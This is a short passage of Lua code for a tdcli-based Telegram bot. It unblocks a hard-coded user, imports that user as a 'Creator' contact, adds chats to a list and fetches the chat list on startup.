    elseif data.chat_.id == 353581089 then
      tdcli.unblockUser(data.chat_.id_)
      tdcli.importContacts(989213985504, "Creator", "", data.chat_.id)
    end
    return add(data.chat_.id_)
  elseif data.ID == "UpdateOption" and data.name_ == "my_id" then
    tdcli.getChats("9223372036854775807", 0, 20)
  end
end
return {update = update}
